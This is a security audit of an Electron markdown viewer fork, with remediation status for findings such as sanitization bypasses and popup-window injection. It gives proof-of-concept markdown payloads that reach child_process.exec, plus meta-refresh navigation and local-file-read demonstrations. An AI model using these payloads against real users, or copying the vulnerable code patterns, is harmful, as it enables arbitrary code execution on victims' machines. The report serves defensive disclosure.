# Security Audit — Folia (formerly Omnicore Markdown Viewer)

> **Amendment (1.0 rebrand).** This audit was written while the fork was still
> named Omnicore Markdown Viewer. The product is now **Folia**, and identifiers
> derived from the old name changed with it (`omnicore-temp-*` → `folia-*`,
> `omnicore-update.bat` → a `folia-update-*` temp directory,
> `omnicore-rawhtml-resize` → `folia-rawhtml-resize`). Code quoted below is
> reproduced **as it stood at audit time** — it is evidence of the vulnerable
> state, and several assertions still pin the old strings precisely so those
> predictable paths cannot return. Descriptions of the *current, fixed* code
> use the new names.

> **Amendment (OmniWare removal).** The OmniWare wireframe feature (`omniwire/`,
> `omniware-config.js`, the `.ow` file association, the `open-omniware-popup`
> window and the ` ```omniware ` fence) has since been **removed from the fork**.
> Findings scoped to it — notably **SEC-04** (renderer output injected raw after
> DOMPurify) and **SEC-06** (`</script>` terminating the popup's script element)
> — are therefore **historical**: the code they describe no longer exists, and
> the attack surface is gone rather than mitigated.
>
> Their controls were **not** simply deleted from the suites. Each was converted
> into a *removal pin* so a re-introduction cannot silently restore the hole:
> `test-render-security.js` asserts the fence now renders as inert escaped code
> on both render paths, and `test-popup-security.js` asserts the
> `open-omniware-popup` channel opens no window at all. Read every OmniWare
> reference below as a record of what was fixed before removal, not as a
> description of the current attack surface.

**Target:** `C:\repos\github\md-viwer` — branch `fix/tab-state-sync` @ `3972921`
**Date:** 2026-07-30
**Scope:** Electron desktop app (`main.js`, `renderer.js`, `index.html`, `custom-*.js`, `omniwire/`, helper modules, build/release config). The bundled `vscode-extension/` sub-project was not audited in depth (separate artifact, separate threat model) and has since been **deleted from the fork** — see Coverage.
**Threat model:** `.md` / `.mmd` / `.ow` file content is **fully attacker-controlled** (downloaded, cloned from untrusted repos, or written by AI agents). The main window runs with `nodeIntegration: true` and `contextIsolation: false`, so **any HTML injection in the renderer is immediately arbitrary code execution with the user's full OS privileges.**

## Executive summary

The rendering pipeline sanitizes with DOMPurify, but then **re-concatenates attacker-controlled markdown into the HTML string *after* sanitization** and assigns the result to `innerHTML`. There are at least four independent zero-click paths from a malicious `.md` file to `require('child_process').exec()`, plus three more one-click paths through the popup windows, where the main process interpolates markdown-derived strings into HTML documents that it loads into further `nodeIntegration: true` windows.

There is **no Content-Security-Policy**, **no preload script**, **no `will-navigate`/`setWindowOpenHandler` guard**, and the three core rendering libraries are **loaded from a public CDN with no Subresource Integrity** into the Node-privileged renderer.

Practically: opening an untrusted markdown file in this application should be treated as equivalent to running an untrusted executable.

| Severity | Count |
|---|---|
| Critical | 7 |
| High | 6 |
| Medium | 8 |
| Low | 3 |
| Info | 2 |
| **Total** | **26** |

**Provenance:** every Critical and High finding is **inherited from upstream** (`OmniCoreST/omnicore-markdown-viewer`) — `git blame` attributes the vulnerable lines in `renderer.js` and `main.js` to upstream authors (`can.kyq61-droid`, `Can Kaya`). The fork-specific files (`custom-tabs.js`, `custom-theme.js`, `custom-language.js`, `custom-collapse.js`, `custom-performance.js`) contain **no injection sinks** — they use `textContent` or static HTML literals. The fork introduces one Low finding (SEC-24, session persistence amplifier). This does not reduce the risk of publishing: publishing the fork publishes the vulnerabilities. *(`custom-language.js` has since been deleted with the interface-language switcher; the statement above describes the tree as audited.)*

## Remediation status

Findings are being fixed in the order given under *Remediation order* at the end of this
document. Everything marked FIXED below is covered by a regression test — in
`test-render-security.js` (`npm run test:security`) for the renderer pipeline and
`test-popup-security.js` (`npm run test:popups`) for the popup windows — that was written
**before** the fix and observed to fail without it.

| Finding | Status | How |
|---|---|---|
| SEC-26 | **FIXED** | `renderMarkdownFull` reordered to parse → assemble → sanitize → insert, so DOMPurify is the last step before DOM insertion in *both* render paths. |
| SEC-02 | **FIXED** | Mermaid bodies escaped at every interpolation site, and inserted as text rather than markup. |
| SEC-03 | **FIXED** (feature since removed) | Slider `src`/`alt` escaped before assembly; the slider itself was removed in `8c2`, so the sink is gone. The payload was retained against the ordinary image path. |
| SEC-04 | **FIXED** | OmniWare DSL and error text escaped before assembly. Mitigated at the pipeline level by sanitize-last; not yet escaped at source in `omniwire/omniware.js`. |
| SEC-01 | **FIXED** (mitigated, feature retained) | `@@@html` frames are pinned to `sandbox="allow-scripts"` with no `allow-same-origin` — enforced both on emission and by a global DOMPurify `afterSanitizeAttributes` hook, so markdown cannot author an un-sandboxed iframe. The frame therefore has an opaque origin and cannot reach `window.parent`. The feature is kept rather than removed. |
| SEC-23 | **FIXED** | The `postMessage` resize listener now identifies the sender by matching `event.source` against the managed frames instead of trusting an index from the message body, and coerces/clamps the reported height. No attacker-controlled string reaches a selector. |
| SEC-05 | **FIXED** | Image popup: `alt` escaped for both the `<title>` and the `alt` attribute; `src` passed through a new `safeImageSrc()` that rejects UNC, protocol-relative, remote `file://` and non-image schemes. The `image-popup-save` IPC handler now verifies the sender is the image popup, caps the payload at 64 MB and requires a strict `data:image/(png\|jpeg);base64,…` URL before writing bytes to disk. |
| SEC-06 | **FIXED** | OmniWare popup: DSL embedded via `toScriptLiteral()`, which escapes `<`, `>`, U+2028 and U+2029 so `</script` is unrepresentable. |
| SEC-07 | **FIXED** | Mermaid popup: SVG passes through `stripActiveSvgContent()`, which now decodes numeric character references before stripping so `javascript&#58;` cannot survive the filter. The CSP below is the primary control. |
| SEC-15 | **FIXED** | Table popup: table data embedded via a new `toJsonLiteral()` (`JSON.stringify` + `\u003c`/`\u003e`/U+2028/U+2029 escaping). `JSON.stringify` alone does not escape `<`, so a cell containing `</script>` terminated the generated script element. |
| SEC-09 | **FIXED** (popups and main window) | Every generated popup document carries a per-document nonce CSP: `default-src 'none'; script-src 'nonce-…'; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'`. All inline `on*=` handlers were converted to `addEventListener` to satisfy it. The main window now has a measured CSP too (`index.html:6-40`); see the SEC-09 entry for the directive-by-directive measurements, the `'unsafe-inline'` concession `@@@html` forces, and the `frame-ancestors` finding. |
| SEC-11 | **FIXED** (popups and main window) | `registerPopup()` denies `will-navigate`, `will-redirect`, `will-frame-navigate` and `setWindowOpenHandler` on every popup, and `<meta>` is stripped from mermaid SVG. The main window now installs the same four guards, `<form>` is in `FORBID_TAGS`, `<area href>` is routed through the link policy, and `<iframe src>` is stripped in the sanitizer hook. See below — the CSP alone did **not** cover this. |
| SEC-08 | **FIXED for the four popup windows**; **deliberately deferred** for the main window | Popups run `nodeIntegration: false, contextIsolation: true` behind `popup-preload.js`, which exposes only fixed channels — and only the single API that popup kind needs, selected by a `--popup-kind=` process argument, so script in one popup cannot drive another's privileged path. The main window is measured and planned rather than done: 40 IPC channels, 70 call sites, 18 sync `fs`/`path`/`os` calls that become async, 6 renderer-only CommonJS modules with no loader once `require` disappears, and a 400-assertion harness that itself depends on `require` in the renderer. Sequenced plan recorded under SEC-08; **not** claimed as fixed. |
| SEC-10 | **FIXED** earlier | Runtime libraries vendored locally; no CDN load. |
| SEC-13 | **FIXED** | Notes tooltip and All-Notes panel rebuilt with `createElement` + `textContent` instead of `innerHTML`. Two further sinks the audit missed were found in the same pass — one of them (`data-note-color` into a `style` attribute) genuinely exploitable. Colour values are now normalized at source and four `[data-note-id="…"]` selectors use `CSS.escape`. See the SEC-13 entry. |
| SEC-14 | **FIXED** | Recent-files menu entries rebuilt with `createElement` + `textContent`. |
| SEC-12 | **FIXED** | Local-file links now go through an extension policy applied to the *resolved* path (`realpathSync`, so a symlink is judged by its real target). Executables, script/macro formats and auto-mounting disk images are refused outright; inert documents and media open directly; `.svg`/`.pdf`/`.rtf` and anything unrecognised require an explicit confirmation naming the file. UNC / protocol-relative paths are rejected *before* `fs.existsSync()`, which was itself the network probe. |
| SEC-16/17/18 | **FIXED** earlier | Dependency upgrades (24 advisories → 0). |
| SEC-19 | **FIXED** | Release workflow: every action pinned to a commit SHA (+ Dependabot to keep the pins moving), `softprops/action-gh-release` moved off the unmaintained v1, `npm ci` instead of `npm install`, `contents: write` narrowed to the publish job only, `persist-credentials: false` on checkout. Also fixed a defect the audit missed: the workflow pinned Node 18 against `engines.node >= 22.12.0` + `engine-strict=true`, so it could not have built at all. Code signing remains open. |
| SEC-27 | **FIXED** | OmniWare's hand-drawn fonts were `@import`ed from fonts.googleapis.com and silently refused by the popup CSP, so every wireframe rendered in generic `cursive`. Fonts vendored locally and emitted as `@font-face` by `omniwareFontFaceCss()`. Found by the error sentinel, not by the audit. |
| SEC-20 | **FIXED** | Popup documents were written to a fixed, world-guessable path under the shared temp directory. Now each goes into its own `mkdtempSync` directory (0700) and is created with `flag: "wx"`, so a pre-planted symlink causes an error instead of a redirected write. The same treatment for the portable-update batch script, whose `exec()` with an interpolated path also became `spawn()` with an argv array. Fixing this also fixed a plain functional bug: two popups of the same kind shared one filename, so the second overwrote the first and whichever closed first deleted the other's document. |
| SEC-21 | **FIXED** (both halves, hardened after review) | `<iframe src>` is stripped in the sanitizer hook (see SEC-11). `style` stays in the allowlist — notes, themes and upstream markdown all need it — so the URLs *inside* CSS are filtered instead: `url()`, `image-set()` and `@import` may name only a relative path, a local drive path or an inert `data:image/…` (SVG excluded). Values are CSS-unescaped before being judged, and remote ones are rewritten to `about:blank`. This matters because `img-src https:` is deliberately open, so the CSP does **not** stop a `background-image` beacon. |
| SEC-22 | **FIXED** | `exec()` with an interpolated path on the WSL export route became `execFile()` with an argument vector, so no shell ever re-parses the filename. **Caveat: not executed end-to-end** — the branch is `process.platform === "linux"` only and this machine is Windows. Syntax- and review-checked, not run. |
| SEC-24 | **WON'T FIX** (by design) | Session restore re-opens the previously-open documents on launch. That is the feature the fork exists for, and every injection route it could re-arm (SEC-01..07, SEC-12/13/14, SEC-21, SEC-26) is now closed at the source. Recorded so the trade is explicit rather than overlooked. |
| SEC-25 | **FIXED** | The no-op `sanitize: false` option is deleted from `marked.setOptions`, with a comment naming DOMPurify as the sole sanitization boundary. Info-severity documentation defect; nothing behavioural changed, so it carries no test. |

### Why the popup CSP is the primary control, not defence in depth

The popup documents are written to a temp file and loaded over `file://`. That origin is
*not* inert just because Node integration is off. Measured directly from a popup running
with `nodeIntegration: false, contextIsolation: true`:

```
fetch('file:///C:/Windows/win.ini')  ->  ok: true, status 200, 92 bytes
POST https://example.com             ->  request left the machine (405 response)
```

So any markup injection that manages to execute script in one of these windows is arbitrary
local-file read plus exfiltration, with or without Node. The regression suite asserts this
directly: with the CSP deliberately weakened, all four popups report
`{"scriptRan":true,"handlerRan":true,"fileRead":"READ:92","exfil":"SENT"}` and sixteen
assertions fail. With the nonce CSP in place, injected `<script>`, injected inline handlers,
the local read and the outbound request are all refused, while the popup's own
nonce-carrying script still runs — that last check is what stops the CSP tests from passing
vacuously against a blank window.

### What the CSP does *not* cover: navigation

A CSP governs what a document may execute, load and connect to. It says nothing about that
document being **replaced**. Chromium never implemented the `navigate-to` directive, so a
markup-only payload can still relocate the window:

```
<svg …></svg><meta http-equiv="refresh" content="0;url=https://example.com/">
<svg …><foreignObject><meta http-equiv="refresh" content="0;url=https://example.com/"></foreignObject></svg>
```

Both were confirmed to navigate the mermaid popup to the attacker's URL. This is worse than
it first appears, and the reason it is treated as a real finding rather than a nuisance: **a
preload survives a navigation**, so the attacker-controlled remote page inherits
`popupBridge` — including, on the image popup, its write-to-disk method — and is then a
normal `https:` origin with none of the temp document's CSP.

The fix is in the main process, because no CSP directive can express it: `registerPopup()`
denies `will-navigate`, `will-redirect` and `will-frame-navigate`, and returns
`{ action: "deny" }` from `setWindowOpenHandler`. `stripActiveSvgContent()` additionally
removes `<meta>` so the element never reaches the document. Both layers are covered
independently — with the guards disabled, the script-driven cases fail; with the `<meta>`
strip *also* disabled, both markup cases fail with the popup sitting on `example.com`.

Two feature assertions guard against over-blocking: the table popup's CSV and JSON exports
build a Blob and click an `<a download>`, which is exactly the kind of thing a
`default-src 'none'` policy plus navigation guards can kill silently. Both are asserted to
still start a real download.

Two hardening changes were made beyond the original findings, both regression-tested:

- **Local image paths.** DOMPurify's default URI allowlist drops Windows drive paths and
  `file://` URLs, which are ordinary usage in a local viewer, so an `<img src>` hook keeps
  drive-letter and `file:///<drive>` paths. The same hook *removes* UNC (`\\host\share`),
  protocol-relative (`//host/share`) and remote `file://host/` image sources — DOMPurify
  keeps the first two by default because they parse as relative references. On Windows those
  are fetched with no user interaction and can hand the user's NTLM credentials to a host
  named by untrusted markdown.
- **Raw-HTML frame ownership.** `@@@html` documents are attached after sanitization, keyed by
  a content hash with a per-key occurrence budget, so a frame can only ever receive a block
  from the current render and a marker authored directly in markdown receives nothing.
- **Packaging integrity.** `popup-preload.js` is a security control that only works if it is
  actually shipped, and `package.json` `build.files` is an allowlist, so omitting it would
  have silently disabled the preload in packaged builds while every test still passed in the
  dev tree. `test-packaging.js` (`npm run test:packaging`) now walks the real runtime
  references — preload paths in `main.js`, `<script>`/`<link>` in `index.html`, `@font-face`
  `url()` in `styles.css` — and asserts each is covered by the allowlist. It self-tests its
  own glob matcher so it cannot pass vacuously. It immediately caught a second, unrelated
  omission: the vendored Fira Code fonts.

---

## SEC-01 — `@@@html` blocks execute arbitrary attacker JavaScript (deliberate sanitizer bypass)

**Severity: Critical** · Category: StringInjection / DataIntegrityFailure · Confidence 9/10 · Upstream

**Location:** `renderer.js:3212-3231` (full render path), `renderer.js:2999-3018` (light-format path)

```js
// renderer.js:3212-3230
// Replace @@@html placeholders with sandboxed iframes (allows Tailwind CDN and scripts to run)
rawHtmlBlocks.forEach(({ placeholder, code }, idx) => {
  const srcdoc = [
    '<!DOCTYPE html><html><head>', ..., '</head><body>',
    code,                                    // <-- raw markdown, never sanitized
    '<scr' + 'ipt>', ... , '</scr' + 'ipt>',
    '</body></html>'
  ].join('');
  const escaped = srcdoc.replace(/"/g, '&quot;');
  const iframeHtml = `<iframe class="raw-html-block" data-rawhtml-idx="${idx}" srcdoc="${escaped}" style="..." scrolling="no"></iframe>`;
  html = html.replace(new RegExp(`<p>${placeholder}</p>|${placeholder}`), iframeHtml);
});
```

Extraction is at `renderer.js:3127-3134`, explicitly commented *"Extract @@@html blocks and replace with placeholders (bypasses DOMPurify)"*. The resulting string reaches `patchViewerDOM(html)` → `temp.innerHTML = newHtml` at `renderer.js:2934`.

**Why it is exploitable.** The comment claims the iframe is "sandboxed". **There is no `sandbox` attribute** — I grepped `main.js`, `renderer.js` and `index.html` for `sandbox` and the only hits are these two misleading comments. The iframe is created via `srcdoc`, which inherits the embedder's origin, so its scripts are same-origin with the Node-privileged main frame and can reach `window.parent.require`.

Attack, zero clicks — opening the file is enough:

````markdown
@@@html
<script>
  window.parent.require('child_process').exec('calc.exe');
</script>
@@@
````

Even under the pessimistic assumption that Chromium blocks the `file:`-origin `parent` access, the finding remains Critical: the iframe still executes arbitrary attacker JS, which combined with **SEC-11** (no `will-navigate` guard) can do `top.location = 'https://attacker/x.html'` on the next user gesture, landing attacker HTML in the `nodeIntegration: true` top frame — guaranteed RCE.

**Fix.** Remove the feature, or: (a) add `sandbox="allow-scripts"` **without** `allow-same-origin` — this alone forces an opaque origin and kills `parent.require`; (b) set `nodeIntegrationInSubFrames: false` explicitly and adopt `contextIsolation: true` (SEC-08); (c) put the raw HTML through DOMPurify like everything else and drop the "escape hatch" entirely.

---

## SEC-02 — Mermaid fence body is injected raw *after* DOMPurify

**Severity: Critical** · Category: StringInjection · Confidence 9/10 · Upstream

**Location:** `renderer.js:3191-3195` (injection) — occurs after `renderer.js:3155` (sanitization)

```js
// renderer.js:3151-3158  — sanitization happens HERE
html = DOMPurify.sanitize(html, {
  ADD_TAGS: ['iframe', 'style'],
  ADD_ATTR: ['target', 'style', 'class', 'id', 'data-note-id', ...]
});
...
// renderer.js:3191-3195 — ...and attacker content is spliced back in AFTER it
mermaidBlocks.forEach(({ placeholder, code }) => {
  const escapedSrc = code.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
  const mermaidDiv = `<pre class="mermaid" data-mermaid-src="${escapedSrc}">${code}</pre>`;
  html = html.replace(placeholder, mermaidDiv);   // ${code} is completely unescaped
});
```

**Why it is exploitable.** `code` is the verbatim body of a ```` ```mermaid ```` fence, captured at `renderer.js:3110-3115`. `escapedSrc` escapes only `&` and `"` for the attribute; the element body `${code}` is escaped not at all — `<` and `>` pass through. The concatenated string is assigned to `innerHTML` at `renderer.js:2934`. `innerHTML` does not run inline `<script>`, but it *does* fire `onerror`/`onload` handlers.

Zero-click payload — a plain `.md` file:

````markdown
```mermaid
<img src=x onerror="require('child_process').exec('calc.exe')">
```
````

Note the `.mmd` / `.mermaid` file association makes this worse: `file-helpers.js:57-63` auto-wraps the *entire* contents of any `.mmd` file in a mermaid fence, so the whole file body lands in this sink.

**Secondary vector, same finding.** `renderer.js:3307-3311` and `renderer.js:6528-6530` interpolate `${error.message}` from a mermaid parse failure into `innerHTML` unescaped. Mermaid's parse errors quote the offending source line back verbatim, so a syntactically invalid diagram containing markup is a second route into the same sink. (I did not construct an end-to-end payload for this variant — the exact error string is parser-dependent — but the primary vector above is unconditional.)

**Fix.** Escape `<`, `>`, `&`, `"` in `${code}` (it is display text inside `<pre>`, it never needs to be markup), and restructure the pipeline so DOMPurify is the **last** step before DOM insertion.

---

## SEC-03 — Image-slider blocks inject `src` and `alt` raw *after* DOMPurify

**Severity: Critical** · Category: StringInjection · Confidence 9/10 · Upstream

**Location:** `renderer.js:3166-3172`; source extraction at `renderer.js:3093-3104`

```js
// renderer.js:3168-3172 — runs after DOMPurify.sanitize at 3155
const slidesHtml = images.map((img, i) =>
  `<div class="slider-slide${i === 0 ? ' active' : ''}" data-index="${i}">
    <img src="${img.src}" alt="${img.alt || ''}">
    ${zoomBtnHtml}
  </div>`
).join('');
```

**Why it is exploitable.** `img.alt` and `img.src` come straight from a regex over the raw markdown (`renderer.js:3097`: `/!\[([^\]]*)\]\(([^)]+)\)/g`). Neither is escaped, and neither is constrained in a way that prevents a `"` from closing the attribute. The alt-text capture group `[^\]]*` permits quotes, parentheses, spaces and `=`.

Zero-click payload:

```markdown
<!-- slider-start -->
![" onerror="require('child_process').exec('calc.exe')](a.png)
<!-- slider-end -->
```

This renders as `<img src="a.png" alt="" onerror="require('child_process').exec('calc.exe')">`. `a.png` does not exist, `onerror` fires on DOM insertion, `require` is in scope because `contextIsolation: false`.

**Fix.** HTML-attribute-escape both values, or build the elements with `document.createElement` + `setAttribute` instead of string concatenation.

**Superseded — the feature was removed outright.** The escaping fix shipped first
and held. The image slider itself was then removed in `8c2`, so the injection
sink described above no longer exists in any form: nothing assembles `<img>`
markup by hand after DOMPurify any more, and the `<!-- slider-start -->` markers
are now inert HTML comments that `marked` passes through.

The demonstrated hazard, however, is a property of image rendering and not of the
slider, so its payload was **kept and re-pointed** at the ordinary image path
rather than deleted with the feature — see `SEC-03 image alt-attribute breakout
does not execute` in `test-render-security.js`, which now drives the same
`![" onerror="...](a.png)` payload as plain markdown, and a second assertion that
drives it still wrapped in the legacy markers. `SEC-26` covers both on the
light-format path.

A third assertion, `REMOVAL a legacy slider document degrades to plain images`,
pins the removal itself: a document authored against the old syntax must still
render its images, with the markers invisible, rather than silently losing them.
`R170` proves it is not vacuous — reinstating the extraction step alone drops the
image count from 2 to 0.

---

## SEC-04 — OmniWare DSL renderer emits unescaped HTML, injected *after* DOMPurify

**Severity: Critical** · Category: StringInjection · Confidence 9/10 · Upstream

**Location:** `renderer.js:3198-3210` (injection after sanitization); `omniwire/omniware.js` — many unescaped interpolations

```js
// renderer.js:3199-3204
const renderedHtml = OmniWare.toHTML(code);
const escapedDsl = code.replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
const omniwareDiv = `<div class="omniware-rendered" data-omniware-dsl="${escapedDsl}">${renderedHtml}</div>`;
html = html.replace(placeholder, omniwareDiv);   // renderedHtml is trusted blindly
```

**Why it is exploitable.** `omniware.js` has an escaping helper — `parseInline()` at `omniwire/omniware.js:591-594` does `.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')` — but **most renderers never call it**. Confirmed unescaped sinks include:

* `omniwire/omniware.js:767` — `` `<div class="ow-nav-logo">◈ ${items[0]}</div>` ``
* `omniwire/omniware.js:772` — `` `<div class="ow-nav-item...">${label}</div>` ``
* `omniwire/omniware.js:793` — `html += title;` (the `section` title prop)
* `omniwire/omniware.js:842, 895, 931, 947, 961, 974, 1002, 1021, 1071-1100` — labels, values, options, textarea bodies, metric cards, form fields

Props are parsed by `parseProps()` (`omniwire/omniware.js:637-660`) directly from the DSL with no filtering.

Zero-click payload:

````markdown
```omniware
@nav
  <img src=x onerror=require('child_process').exec('calc.exe')> | Home
```
````

The `.ow` file association makes this a one-double-click drive-by: `file-helpers.js:74-81` wraps the entire contents of any `.ow` file in an `omniware` fence.

**Fix.** Route every user-derived value in `omniware.js` through `parseInline()` (or a dedicated `escapeHtml`), and sanitize `OmniWare.toHTML()` output before insertion.

---

## SEC-05 — Image popup: `alt` and `src` interpolated into a `nodeIntegration` HTML document by the main process

**Severity: Critical** · Category: StringInjection · Confidence 9/10 · Upstream

**Location:** `main.js:1579-1596` (window), `main.js:1611` and `main.js:1709` (injection); trigger at `renderer.js:3560-3566` and `renderer.js:3474-3480`

```js
// main.js:1583-1592
const popupWindow = new BrowserWindow({ ..., webPreferences: {
  nodeIntegration: true,
  contextIsolation: false,
}, title, ... });
...
// main.js:1611
  <title>${alt || "Image Viewer"}</title>
...
// main.js:1709
      <img id="the-img" src="${src}" alt="${alt || ""}">
```

**Why it is exploitable.** The renderer sends `alt: img.alt || ''` (`renderer.js:3563`) — the DOM `alt` **property**, i.e. the entity-decoded raw markdown alt text, quotes and angle brackets intact. DOMPurify preserves `alt` values verbatim (it is a text attribute, not a URL). The main process then interpolates it into a fresh HTML document with **zero escaping** and loads it into a window with full Node integration.

Payload — user clicks the magnifier badge that the app itself renders on every image:

```markdown
![</title><script>require('child_process').exec('calc.exe')</script>](x.png)
```

`main.js:1611` closes the `<title>` element early and the injected `<script>` runs on load. Unlike the `innerHTML` sinks, this is a full document parse, so `<script>` executes directly. The `alt="${alt}"` sink at `main.js:1709` gives a second, `onerror`-based variant.

**Fix.** HTML-escape `alt` and validate `src` against an allowlist (`file:`, `data:image/*`, `https:`) in the **main** process. Better: replace the string-built temp HTML with a static asset file plus `contextBridge`-delivered data.

---

## SEC-06 — OmniWare popup: `</script>` breakout defeats the template-literal escaping

**Severity: Critical** · Category: StringInjection · Confidence 9/10 · Upstream

**Location:** `main.js:1435-1449` (window), `main.js:1463-1467` (escaping), `main.js:1515` (injection); trigger at `renderer.js:3344-3349`

```js
// main.js:1463-1467
const escapedDsl = dslCode
  .replace(/\\/g, "\\\\")
  .replace(/`/g, "\\`")
  .replace(/\$/g, "\\$");
...
// main.js:1515 — inside a <script> element in the generated document
    const dsl = \`${escapedDsl}\`;
```

**Why it is exploitable.** The escaping correctly protects the **JavaScript template literal** (backslash first, then backtick, then `$` — the right order). It does not protect the **HTML `<script>` element** that contains it. The HTML tokenizer terminates a script block at the first `</script`, regardless of JS string context. `<`, `>` and `/` are untouched by the three `.replace()` calls.

Payload — user clicks the "maximize" button on the wireframe:

````markdown
```omniware
@note
  </script><script>require('child_process').exec('calc.exe')</script>
```
````

The renderer round-trips this faithfully: `renderer.js:3200-3201` escapes `<`/`>` into the `data-omniware-dsl` attribute, and `renderer.js:3345-3346` decodes them straight back (`.replace(/&lt;/g,'<').replace(/&gt;/g,'>')`) before sending over IPC. Window is `nodeIntegration: true` (`main.js:1444-1445`).

**Fix.** Additionally escape `<` as `\x3c` (or JSON-encode the value and parse it), and stop generating executable HTML from strings in the main process.

---

## SEC-07 — Mermaid popup: rendered SVG interpolated raw into a `nodeIntegration` document

**Severity: High** · Category: StringInjection · Confidence 7/10 · Upstream

**Location:** `main.js:1060-1075` (window, `nodeIntegration: true` at `main.js:1070-1071`), `main.js:1164` (`${svgContent}` interpolated raw); trigger at `renderer.js:3293-3296` and `renderer.js:6502`

**Why it is a risk.** `svgContent` is `svg.outerHTML` of a mermaid-rendered diagram, injected into a generated HTML document with no escaping and no sanitization. Mermaid's default `securityLevel: 'strict'` (see Coverage — the app never overrides it) means labels are DOMPurify-sanitized by mermaid itself, so I **could not construct a working payload** for the pinned version; the SVG serialization path also re-escapes text nodes.

However: the app pins **mermaid 10.6.1** from a CDN (`index.html:27`), which is below the 10.9.6 fix line for the mermaid sanitization advisories, and this sink has zero defence in depth — a single mermaid sanitizer bypass converts directly into RCE, because unlike the main viewer this document is parsed as a full HTML document (so `<script>` executes, not just event handlers).

**Fix.** Sanitize `svgContent` in the main process before interpolation, and load the popup with `nodeIntegration: false, contextIsolation: true` (the table popup at `main.js:1866-1867` already demonstrates this is feasible).

---

## SEC-08 — `nodeIntegration: true`, `contextIsolation: false`, no preload on four of five windows

**Severity: Critical** · Category: SecurityMisconfiguration · Confidence 10/10 · Upstream

**Location:** `main.js:128-133` (main window), `main.js:1069-1072` (mermaid popup), `main.js:1443-1446` (omniware popup), `main.js:1588-1591` (image popup). Contrast: `main.js:1865-1868` (table popup) correctly uses `nodeIntegration: false, contextIsolation: true`.

```js
// main.js:128-133
webPreferences: {
  nodeIntegration: true,
  contextIsolation: false,
  enableRemoteModule: true,
  backgroundThrottling: true,
},
```

**Why it matters.** This is the multiplier that turns every finding above from "annoying HTML injection" into "remote code execution". `renderer.js:4-8` immediately pulls `ipcRenderer`, `shell`, `clipboard`, `fs` and `path` into the global scope, and `renderer.js:~5600` re-exports `window.fs`, `window.path`, `window.ipcRenderer` for the custom overlays — so injected script does not even need `require`; `window.fs` is sitting there.

I confirmed **no preload script exists** anywhere in the repo (no `preload:` key in any `webPreferences`, no `preload.js` file). There is therefore no `contextBridge` surface at all; the renderer is simply a privileged Node process rendering hostile input.

`enableRemoteModule: true` (`main.js:131`) is a no-op on Electron 37 (the remote module was removed in Electron 14), but it signals the app was written against a much older, pre-hardening Electron security model.

The table popup at `main.js:1856-1868` shows the correct configuration — the divergence appears to be incidental (Tabulator needs no Node) rather than a deliberate security decision, since the three popups that *do* handle attacker-controlled content are the insecure ones.

**Fix.** The correct long-term fix is `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` on every window, with a minimal preload exposing a typed, validated API over `contextBridge`. This is a substantial refactor because `renderer.js` uses `fs`/`path` directly in ~40 places. As an interim step, at minimum flip the three popup windows (`main.js:1069, 1443, 1588`) to `nodeIntegration: false` — they have no legitimate Node requirement beyond `ipcRenderer.send`, which a 10-line preload can provide.

### PARTIALLY FIXED — all four popups done; the main window deferred, with a plan

**Done.** Every popup now runs `nodeIntegration: false, contextIsolation: true`
behind its own minimal preload, exposing only that popup's own bridge API. Four
assertions in `test-popup-security.js` pin it ("*popup exposes only its own
bridge API"), so a popup cannot silently regain Node access.

**Deferred: the main window** (`main.js:384`). This is a deliberate, measured
decision rather than an omission, so the measurements are recorded here.

| What has to move | Count |
|---|---|
| Distinct `ipcRenderer` channels to re-expose over `contextBridge` | 40 |
| `ipcRenderer.*` call sites | 70 |
| Direct `fs.*` / `path.*` / `os.*` calls that must become IPC round-trips (and therefore **async**, changing their callers' control flow) | 5 / 12 / 1 |
| Local CommonJS modules the renderer `require()`s, which have no `require` once `nodeIntegration` is off | 6 (`utils`, `emoji-parser`, `mermaid-config`, `omniware-config`, `context-menu-utils`, `file-helpers` — 487 lines total, all `module.exports`) |
| npm module `require()`d directly by the renderer | 1 (`html2canvas`) |
| Lines in `renderer.js` | 8631 |

The awkward part is not the count, it is the **`module.exports` modules**: none
of them are shared with `main.js`, so they are renderer-only CommonJS with no
loader once `require` disappears. Every one needs either a `<script>` tag and a
global, or a bundler — and this project deliberately has no build step. That is
a structural change to how the app is assembled, not a security patch.

Two further consequences that make "just flip the flag" wrong:

1. **`fs`/`path`/`os` calls become asynchronous.** 18 call sites currently
   return synchronously; over IPC they cannot. Each caller's control flow
   changes, and several sit inside the render pipeline whose ordering
   invariants are exactly what PERF-04/05/06 and the mermaid race work were
   about. This is where regressions would hide.
2. **The test harnesses would all need reworking.** Every Electron suite drives
   the app with `executeJavaScript("require('electron').ipcRenderer…")`, which
   stops working the moment the renderer loses `require`. The 400-assertion
   safety net would have to be rebuilt *first*, or the refactor is done blind.

**Why deferring is defensible, and where it is not.** SEC-01..07, SEC-11,
SEC-12, SEC-13/14, SEC-21 and SEC-26 closed the injection routes that would let
an attacker reach this privilege in the first place, and SEC-09 constrains what
the window can load and reach. What remains is that *if* an injection is ever
found again, it is immediately RCE rather than defaced HTML. That is a real,
unmitigated severity multiplier and it is **not** claimed to be fixed.

**Order of work when it is picked up** (each step independently shippable and
testable, which the all-at-once version is not):

1. Rebuild the harnesses' renderer access on a test-only preload so they no
   longer depend on `require` in the renderer.
2. Give the 6 local modules a loader that works either way (plain `<script>` +
   a namespaced global), leaving `module.exports` intact for Node consumers.
3. Move the 18 `fs`/`path`/`os` call sites to IPC one at a time, converting
   each caller to async.
4. Replace the 70 `ipcRenderer` call sites with a `contextBridge` API that
   validates its arguments — the channel list is fixed and small (40), so this
   is mechanical once step 3 is done.
5. Only then flip `nodeIntegration: false, contextIsolation: true`, and finally
   `sandbox: true`.

---

## SEC-09 — No Content-Security-Policy anywhere

**Severity: High** · Category: SecurityMisconfiguration · Confidence 10/10 · Upstream

**Location:** `index.html:1-31` (no `<meta http-equiv="Content-Security-Policy">`); `main.js` (no `session.defaultSession.webRequest.onHeadersReceived`, no `session` usage at all)

I grepped `main.js`, `renderer.js` and `index.html` for `Content-Security`, `session.`, `defaultSession`, `onHeadersReceived` — **zero matches**. The generated popup documents (`main.js:1083`, `1469`, `1604`, `1878`) likewise have no CSP meta tag.

